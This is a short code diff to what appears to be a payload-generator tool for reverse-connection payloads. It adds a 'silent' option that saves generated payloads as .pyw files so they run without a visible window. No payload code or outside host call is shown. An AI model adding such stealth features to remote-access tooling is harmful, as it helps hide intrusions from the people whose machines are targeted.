@@ -16,7 +16,8 @@ def depargs() -> dict:
     return {
         "host": "Reverse IPv4",
         "port": "Reverse port",
-        "module": "Path to the required post module"
+        "module": "Path to the required post module",
+        "silent": "Make payload silent (Yes/no)"
     }
 
 #imports
@@ -45,6 +46,7 @@ def launch(args: dict) -> None:
         ip = args.get("host", "127.0.0.1")
         port = args.get("port", "8888")
         module = args.get("module", "payloads/sampletcp")
+        silent = args.get("silent", "no")
         if module.startswith("payloads"):
             currdir = os.path.dirname(os.path.abspath(__file__))
             payloadspath = os.path.join(currdir, '..', 'payloads')
@@ -61,7 +63,7 @@ def launch(args: dict) -> None:
                         root = os.path.join(currdir, "..", "..", "output") 
                         os.makedirs(root, exist_ok=True)
                         while True:
-                            outpath = os.path.join(root, f"payload{count}.py")
+                            outpath = os.path.join(root, f"payload{count}.pyw" if silent == "yes" else f"payload{count}.py")
                             if not os.path.exists(outpath):
                                 break
                             count += 1
